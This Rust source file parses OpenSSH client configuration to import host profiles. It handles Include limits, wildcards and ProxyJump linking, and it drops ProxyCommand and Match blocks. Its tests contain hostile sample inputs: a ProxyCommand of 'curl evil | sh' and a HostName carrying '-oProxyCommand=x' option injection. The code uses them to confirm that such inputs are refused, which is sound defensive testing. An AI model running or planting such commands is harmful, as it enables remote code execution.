//! Parser for OpenSSH client configuration, used only to import host profiles.
//!
//! Nothing here executes anything: `ProxyCommand`, `LocalCommand` and `Match exec`
//! are reported as warnings and dropped.

use std::path::{Path, PathBuf};

use crate::error::Result;
use crate::profile::{
    validate_host, validate_user, AuthMethod, ProfileSource, SshProfile, DEFAULT_KEEPALIVE_SECS,
    DEFAULT_PORT,
};
use crate::profile_store::{ImportSummary, ProfileStore};

const MAX_INCLUDE_DEPTH: usize = 8;
const MAX_INCLUDED_FILES: usize = 64;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImportedHost {
    pub alias: String,
    pub host_name: String,
    pub user: Option<String>,
    pub port: Option<u16>,
    pub identity_file: Option<String>,
    pub proxy_jump: Option<String>,
    pub keepalive_secs: Option<u32>,
    pub warnings: Vec<String>,
}

#[derive(Debug, Default, PartialEq, Eq)]
pub struct ParsedConfig {
    pub hosts: Vec<ImportedHost>,
    pub warnings: Vec<String>,
}

#[derive(Debug)]
struct Directive {
    keyword: String,
    args: Vec<String>,
}

#[derive(Debug)]
struct Block {
    patterns: Vec<String>,
    ignored: bool,
    options: Vec<Directive>,
}

fn split_directive(line: &str) -> Option<Directive> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let end = line
        .find(|c: char| c.is_whitespace() || c == '=')
        .unwrap_or(line.len());
    let keyword = line[..end].to_ascii_lowercase();
    let mut rest = line[end..].trim_start();
    if let Some(stripped) = rest.strip_prefix('=') {
        rest = stripped.trim_start();
    }
    Some(Directive {
        keyword,
        args: split_args(rest),
    })
}

fn split_args(rest: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut has_token = false;
    let mut prev_space = true;
    let mut chars = rest.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '"' => {
                in_quotes = !in_quotes;
                has_token = true;
                prev_space = false;
            }
            '\\' if in_quotes && chars.peek() == Some(&'"') => {
                current.push('"');
                chars.next();
                prev_space = false;
            }
            '#' if !in_quotes && prev_space => break,
            c if c.is_whitespace() && !in_quotes => {
                if has_token {
                    args.push(std::mem::take(&mut current));
                    has_token = false;
                }
                prev_space = true;
            }
            c => {
                current.push(c);
                has_token = true;
                prev_space = false;
            }
        }
    }
    if has_token {
        args.push(current);
    }
    args
}

fn flatten(
    text: &str,
    depth: usize,
    included: &mut usize,
    resolver: &mut dyn FnMut(&str) -> Vec<String>,
    warnings: &mut Vec<String>,
    out: &mut Vec<Directive>,
) {
    for line in text.lines() {
        let Some(directive) = split_directive(line) else {
            continue;
        };
        if directive.keyword != "include" {
            out.push(directive);
            continue;
        }
        if depth >= MAX_INCLUDE_DEPTH {
            warnings.push("Include nesting is too deep, some files were skipped".to_string());
            continue;
        }
        for pattern in &directive.args {
            for content in resolver(pattern) {
                if *included >= MAX_INCLUDED_FILES {
                    warnings.push("too many Include files, the rest were skipped".to_string());
                    return;
                }
                *included += 1;
                flatten(&content, depth + 1, included, resolver, warnings, out);
            }
        }
    }
}

/// Case-insensitive match supporting `*` and `?`.
pub fn wildcard_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.to_lowercase().chars().collect();
    let t: Vec<char> = text.to_lowercase().chars().collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let (mut star, mut mark) = (None::<usize>, 0usize);
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some(pi);
            mark = ti;
            pi += 1;
        } else if let Some(s) = star {
            pi = s + 1;
            mark += 1;
            ti = mark;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

fn is_concrete(pattern: &str) -> bool {
    !pattern.is_empty() && !pattern.contains(['*', '?', '!'])
}

fn block_matches(patterns: &[String], alias: &str) -> bool {
    let mut positive = false;
    for pattern in patterns {
        if let Some(negated) = pattern.strip_prefix('!') {
            if wildcard_match(negated, alias) {
                return false;
            }
        } else if wildcard_match(pattern, alias) {
            positive = true;
        }
    }
    positive
}

fn first_value<'a>(blocks: &'a [Block], alias: &str, keyword: &str) -> Option<&'a Directive> {
    blocks
        .iter()
        .filter(|b| !b.ignored && block_matches(&b.patterns, alias))
        .flat_map(|b| b.options.iter())
        .find(|d| d.keyword == keyword && !d.args.is_empty())
}

pub fn parse(text: &str, resolver: &mut dyn FnMut(&str) -> Vec<String>) -> ParsedConfig {
    let mut warnings = Vec::new();
    let mut directives = Vec::new();
    let mut included = 0usize;
    flatten(
        text,
        0,
        &mut included,
        resolver,
        &mut warnings,
        &mut directives,
    );

    let mut blocks = vec![Block {
        patterns: vec!["*".to_string()],
        ignored: false,
        options: Vec::new(),
    }];
    let mut warned_match = false;
    for directive in directives {
        match directive.keyword.as_str() {
            "host" => blocks.push(Block {
                patterns: directive.args,
                ignored: false,
                options: Vec::new(),
            }),
            "match" => {
                if !warned_match {
                    warnings.push("Match blocks are not imported".to_string());
                    warned_match = true;
                }
                blocks.push(Block {
                    patterns: Vec::new(),
                    ignored: true,
                    options: Vec::new(),
                });
            }
            _ => {
                if let Some(block) = blocks.last_mut() {
                    block.options.push(directive);
                }
            }
        }
    }

    let mut aliases: Vec<String> = Vec::new();
    for block in blocks.iter().filter(|b| !b.ignored) {
        for pattern in &block.patterns {
            if is_concrete(pattern) && !aliases.contains(pattern) {
                aliases.push(pattern.clone());
            }
        }
    }

    let hosts = aliases
        .into_iter()
        .map(|alias| host_for(&blocks, alias))
        .collect();
    ParsedConfig { hosts, warnings }
}

fn host_for(blocks: &[Block], alias: String) -> ImportedHost {
    let mut warnings = Vec::new();

    let host_name = first_value(blocks, &alias, "hostname")
        .map(|d| d.args[0].replace("%h", &alias))
        .unwrap_or_else(|| alias.clone());

    let user = first_value(blocks, &alias, "user").map(|d| d.args[0].clone());

    let port = first_value(blocks, &alias, "port").and_then(|d| match d.args[0].parse::<u16>() {
        Ok(p) if p != 0 => Some(p),
        _ => {
            warnings.push(format!("ignored invalid Port {:?}", d.args[0]));
            None
        }
    });

    let identity_file = first_value(blocks, &alias, "identityfile").and_then(|d| {
        let path = &d.args[0];
        if path.contains('%') || path.contains("${") {
            warnings.push("IdentityFile uses tokens, set the key manually".to_string());
            None
        } else {
            Some(path.clone())
        }
    });

    let proxy_jump = first_value(blocks, &alias, "proxyjump").and_then(|d| {
        let value = d.args.join(" ");
        if value.eq_ignore_ascii_case("none") {
            return None;
        }
        if value.contains(',') {
            warnings.push("multi-hop ProxyJump is not supported, set the jump host manually".to_string());
            return None;
        }
        Some(value)
    });

    if first_value(blocks, &alias, "proxycommand").is_some() {
        warnings.push("ProxyCommand is not supported and was ignored".to_string());
    }

    let keepalive_secs = first_value(blocks, &alias, "serveraliveinterval")
        .and_then(|d| d.args[0].parse::<u32>().ok())
        .map(|s| s.min(3600));

    ImportedHost {
        alias,
        host_name,
        user,
        port,
        identity_file,
        proxy_jump,
        keepalive_secs,
        warnings,
    }
}

fn default_user() -> Option<String> {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .ok()
        .filter(|u| validate_user(u).is_ok())
}

fn to_profile(host: &ImportedHost, fallback_user: Option<&str>) -> std::result::Result<SshProfile, String> {
    validate_host(&host.host_name).map_err(|e| e.message)?;
    let user = host
        .user
        .clone()
        .or_else(|| fallback_user.map(str::to_string))
        .ok_or_else(|| "no User set and the local user name is unknown".to_string())?;
    let auth = match &host.identity_file {
        Some(path) => AuthMethod::KeyFile { path: path.clone() },
        None => AuthMethod::Agent,
    };
    Ok(SshProfile {
        id: String::new(),
        name: host.alias.clone(),
        host: host.host_name.clone(),
        port: host.port.unwrap_or(DEFAULT_PORT),
        user,
        auth,
        jump_host: None,
        keepalive_secs: host.keepalive_secs.unwrap_or(DEFAULT_KEEPALIVE_SECS),
        color: None,
        tags: vec!["ssh-config".to_string()],
        favorite: false,
        default_remote_dir: None,
        default_local_dir: None,
        source: ProfileSource::SshConfig,
    })
}

#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ConfigImport {
    pub summary: ImportSummary,
    pub warnings: Vec<String>,
}

/// Imports parsed hosts into the store. A `ProxyJump` that names another imported or existing
/// profile is linked as a jump host.
pub fn import_into(
    store: &mut ProfileStore,
    parsed: &ParsedConfig,
    fallback_user: Option<&str>,
) -> Result<ConfigImport> {
    let mut warnings = parsed.warnings.clone();
    let mut profiles = Vec::new();
    let mut convertible: Vec<&ImportedHost> = Vec::new();
    let mut skipped = Vec::new();
    for host in &parsed.hosts {
        for warning in &host.warnings {
            warnings.push(format!("{}: {warning}", host.alias));
        }
        match to_profile(host, fallback_user) {
            Ok(profile) => {
                profiles.push(profile);
                convertible.push(host);
            }
            Err(reason) => skipped.push(format!("{} ({reason})", host.alias)),
        }
    }
    let mut summary = store.import(profiles)?;
    summary.skipped.extend(skipped);

    for host in convertible {
        let Some(jump_alias) = &host.proxy_jump else {
            continue;
        };
        if !summary.added.contains(&host.alias) {
            continue;
        }
        let jump_name = jump_alias.rsplit('@').next().unwrap_or(jump_alias);
        let jump_name = jump_name.split(':').next().unwrap_or(jump_name);
        let jump_id = store.list().iter().find(|p| p.name == jump_name).map(|p| p.id.clone());
        let me = store.list().iter().find(|p| p.name == host.alias).cloned();
        match (jump_id, me) {
            (Some(jump_id), Some(mut me)) => {
                me.jump_host = Some(jump_id);
                if let Err(err) = store.save(me) {
                    warnings.push(format!("{}: could not set jump host ({})", host.alias, err.message));
                }
            }
            _ => warnings.push(format!(
                "{}: ProxyJump {jump_alias:?} is not a known host, set the jump host manually",
                host.alias
            )),
        }
    }
    Ok(ConfigImport { summary, warnings })
}

fn ssh_dir() -> Option<PathBuf> {
    dirs::home_dir().map(|h| h.join(".ssh"))
}

fn expand_include_pattern(pattern: &str, base: &Path) -> PathBuf {
    if let Some(rest) = pattern.strip_prefix("~/") {
        return dirs::home_dir().unwrap_or_default().join(rest);
    }
    let candidate = PathBuf::from(pattern);
    if candidate.is_absolute() {
        candidate
    } else {
        base.join(candidate)
    }
}

fn read_include(pattern: &str, base: &Path) -> Vec<String> {
    let path = expand_include_pattern(pattern, base);
    let Some(file_pattern) = path.file_name().and_then(|n| n.to_str()).map(str::to_string) else {
        return Vec::new();
    };
    if !file_pattern.contains(['*', '?']) {
        return std::fs::read_to_string(&path).into_iter().collect();
    }
    let Some(dir) = path.parent() else {
        return Vec::new();
    };
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<PathBuf> = entries
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.file_name()
                .to_str()
                .is_some_and(|name| wildcard_match(&file_pattern, name))
        })
        .map(|e| e.path())
        .filter(|p| p.is_file())
        .collect();
    files.sort();
    files
        .into_iter()
        .filter_map(|p| std::fs::read_to_string(p).ok())
        .collect()
}

/// Reads and parses `~/.ssh/config`, following `Include` directives. A missing file is an empty result.
pub fn parse_user_config() -> Result<ParsedConfig> {
    let Some(dir) = ssh_dir() else {
        return Ok(ParsedConfig::default());
    };
    let text = match std::fs::read_to_string(dir.join("config")) {
        Ok(text) => text,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(ParsedConfig::default()),
        Err(err) => return Err(err.into()),
    };
    let mut resolver = |pattern: &str| read_include(pattern, &dir);
    Ok(parse(&text, &mut resolver))
}

pub fn import_user_config(store: &mut ProfileStore) -> Result<ConfigImport> {
    let parsed = parse_user_config()?;
    import_into(store, &parsed, default_user().as_deref())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse_plain(text: &str) -> ParsedConfig {
        parse(text, &mut |_| Vec::new())
    }

    #[test]
    fn parses_a_basic_host_block() {
        let cfg = parse_plain(
            "Host web\n  HostName web.example.com\n  User deploy\n  Port 2222\n  IdentityFile ~/.ssh/web_ed25519\n",
        );
        assert_eq!(cfg.hosts.len(), 1);
        let h = &cfg.hosts[0];
        assert_eq!(h.alias, "web");
        assert_eq!(h.host_name, "web.example.com");
        assert_eq!(h.user.as_deref(), Some("deploy"));
        assert_eq!(h.port, Some(2222));
        assert_eq!(h.identity_file.as_deref(), Some("~/.ssh/web_ed25519"));
    }

    #[test]
    fn keywords_are_case_insensitive_and_accept_equals() {
        let cfg = parse_plain("host=a\nhostname = a.example\nUSER=me\n");
        assert_eq!(cfg.hosts[0].alias, "a");
        assert_eq!(cfg.hosts[0].host_name, "a.example");
        assert_eq!(cfg.hosts[0].user.as_deref(), Some("me"));
    }

    #[test]
    fn hostname_defaults_to_the_alias_and_supports_percent_h() {
        let cfg = parse_plain("Host box\n  User u\nHost app\n  HostName %h.internal\n");
        assert_eq!(cfg.hosts[0].host_name, "box");
        assert_eq!(cfg.hosts[1].host_name, "app.internal");
    }

    #[test]
    fn several_patterns_on_one_host_line_create_several_hosts() {
        let cfg = parse_plain("Host a b c\n  User shared\n");
        let aliases: Vec<_> = cfg.hosts.iter().map(|h| h.alias.as_str()).collect();
        assert_eq!(aliases, vec!["a", "b", "c"]);
        assert!(cfg.hosts.iter().all(|h| h.user.as_deref() == Some("shared")));
    }

    #[test]
    fn wildcard_blocks_supply_defaults_and_are_not_hosts() {
        let cfg = parse_plain(
            "Host *\n  User fallback\n  ServerAliveInterval 15\nHost *.corp\n  Port 2200\nHost build.corp\n  HostName 10.0.0.5\nHost other\n",
        );
        let aliases: Vec<_> = cfg.hosts.iter().map(|h| h.alias.as_str()).collect();
        assert_eq!(aliases, vec!["build.corp", "other"]);
        let build = &cfg.hosts[0];
        assert_eq!(build.user.as_deref(), Some("fallback"));
        assert_eq!(build.port, Some(2200));
        assert_eq!(build.keepalive_secs, Some(15));
        assert_eq!(cfg.hosts[1].port, None);
    }

    #[test]
    fn the_first_obtained_value_wins() {
        let cfg = parse_plain("Host a\n  User first\nHost *\n  User second\nHost a\n  User third\n");
        assert_eq!(cfg.hosts[0].user.as_deref(), Some("first"));
    }

    #[test]
    fn options_before_any_host_line_apply_globally() {
        let cfg = parse_plain("User root\nHost a\n");
        assert_eq!(cfg.hosts[0].user.as_deref(), Some("root"));
    }

    #[test]
    fn negated_patterns_exclude_hosts() {
        let cfg = parse_plain("Host * !skipme\n  User u\nHost skipme\nHost keep\n");
        let skip = cfg.hosts.iter().find(|h| h.alias == "skipme").unwrap();
        let keep = cfg.hosts.iter().find(|h| h.alias == "keep").unwrap();
        assert_eq!(skip.user, None);
        assert_eq!(keep.user.as_deref(), Some("u"));
    }

    #[test]
    fn comments_quotes_and_blank_lines_are_handled() {
        let cfg = parse_plain(
            "# top comment\n\nHost \"quoted host\"\n  HostName h # trailing comment\n  IdentityFile \"/path with space/key\"\n",
        );
        assert_eq!(cfg.hosts[0].alias, "quoted host");
        assert_eq!(cfg.hosts[0].host_name, "h");
        assert_eq!(cfg.hosts[0].identity_file.as_deref(), Some("/path with space/key"));
    }

    #[test]
    fn match_blocks_are_ignored_with_one_warning() {
        let cfg = parse_plain(
            "Host a\n  User keep\nMatch host a exec \"true\"\n  User evil\nMatch all\n  Port 1\n",
        );
        assert_eq!(cfg.hosts[0].user.as_deref(), Some("keep"));
        assert_eq!(cfg.hosts[0].port, None);
        assert_eq!(cfg.warnings, vec!["Match blocks are not imported".to_string()]);
    }

    #[test]
    fn proxy_command_is_never_imported() {
        let cfg = parse_plain("Host a\n  ProxyCommand sh -c 'curl evil | sh'\n");
        assert!(cfg.hosts[0].warnings.iter().any(|w| w.contains("ProxyCommand")));
        assert_eq!(cfg.hosts[0].proxy_jump, None);
    }

    #[test]
    fn proxy_jump_single_hop_none_and_multi_hop() {
        let cfg = parse_plain(
            "Host a\n  ProxyJump bastion\nHost b\n  ProxyJump none\nHost c\n  ProxyJump x,y\n",
        );
        assert_eq!(cfg.hosts[0].proxy_jump.as_deref(), Some("bastion"));
        assert_eq!(cfg.hosts[1].proxy_jump, None);
        assert_eq!(cfg.hosts[2].proxy_jump, None);
        assert!(cfg.hosts[2].warnings.iter().any(|w| w.contains("multi-hop")));
    }

    #[test]
    fn identity_files_with_tokens_and_bad_ports_warn() {
        let cfg = parse_plain("Host a\n  IdentityFile ~/.ssh/%h_key\n  Port notaport\n");
        assert_eq!(cfg.hosts[0].identity_file, None);
        assert_eq!(cfg.hosts[0].port, None);
        assert_eq!(cfg.hosts[0].warnings.len(), 2);
    }

    #[test]
    fn include_is_resolved_through_the_callback() {
        let mut resolver = |pattern: &str| match pattern {
            "extra/*" => vec!["Host inc1\n  User one\n".to_string(), "Host inc2\n".to_string()],
            _ => Vec::new(),
        };
        let cfg = parse("Include extra/*\nHost main\n", &mut resolver);
        let aliases: Vec<_> = cfg.hosts.iter().map(|h| h.alias.as_str()).collect();
        assert_eq!(aliases, vec!["inc1", "inc2", "main"]);
    }

    #[test]
    fn self_referential_includes_terminate() {
        let mut calls = 0usize;
        let mut resolver = |_: &str| {
            calls += 1;
            vec!["Include again\nHost loop\n".to_string()]
        };
        let cfg = parse("Include again\n", &mut resolver);
        assert!(cfg.warnings.iter().any(|w| w.contains("Include")));
        assert!(calls <= MAX_INCLUDED_FILES + MAX_INCLUDE_DEPTH);
    }

    #[test]
    fn wildcard_matching_basics() {
        assert!(wildcard_match("*", "anything"));
        assert!(wildcard_match("*.corp", "a.corp"));
        assert!(!wildcard_match("*.corp", "a.corp.evil"));
        assert!(wildcard_match("web-??", "web-01"));
        assert!(!wildcard_match("web-??", "web-1"));
        assert!(wildcard_match("A*B", "axxb"));
        assert!(wildcard_match("a*b*c", "aXbYc"));
        assert!(!wildcard_match("a*b*c", "aXbY"));
    }

    #[test]
    fn import_into_creates_profiles_and_links_jump_hosts() {
        let dir = tempfile::tempdir().unwrap();
        let mut store = ProfileStore::open(dir.path().join("p.json")).unwrap();
        let cfg = parse_plain(
            "Host bastion\n  HostName b.example.com\n  User ops\nHost app\n  HostName app.internal\n  ProxyJump ops@bastion:22\nHost lost\n  ProxyJump nowhere\n",
        );
        let result = import_into(&mut store, &cfg, Some("me")).unwrap();
        assert_eq!(result.summary.added.len(), 3);
        let bastion = store.list().iter().find(|p| p.name == "bastion").unwrap().clone();
        let app = store.list().iter().find(|p| p.name == "app").unwrap();
        assert_eq!(app.jump_host.as_deref(), Some(bastion.id.as_str()));
        assert_eq!(app.user, "me");
        assert_eq!(app.source, ProfileSource::SshConfig);
        assert!(result.warnings.iter().any(|w| w.contains("nowhere")));
    }

    #[test]
    fn import_into_skips_hosts_that_cannot_become_valid_profiles() {
        let dir = tempfile::tempdir().unwrap();
        let mut store = ProfileStore::open(dir.path().join("p.json")).unwrap();
        let cfg = parse_plain("Host bad\n  HostName -oProxyCommand=x\n  User u\nHost nouser\n");
        let result = import_into(&mut store, &cfg, None).unwrap();
        assert!(result.summary.added.is_empty());
        assert_eq!(result.summary.skipped.len(), 2);
        assert!(store.list().is_empty());
    }

    #[test]
    fn user_config_includes_are_read_relative_to_the_ssh_dir() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("config.d")).unwrap();
        std::fs::write(dir.path().join("config.d/a.conf"), "Host from-a\n").unwrap();
        std::fs::write(dir.path().join("config.d/b.conf"), "Host from-b\n").unwrap();
        std::fs::write(dir.path().join("config.d/skip.txt"), "Host nope\n").unwrap();
        let included = read_include("config.d/*.conf", dir.path());
        assert_eq!(included.len(), 2);
        let cfg = parse("Include config.d/*.conf\n", &mut |p| read_include(p, dir.path()));
        assert_eq!(cfg.hosts.len(), 2);
    }
}
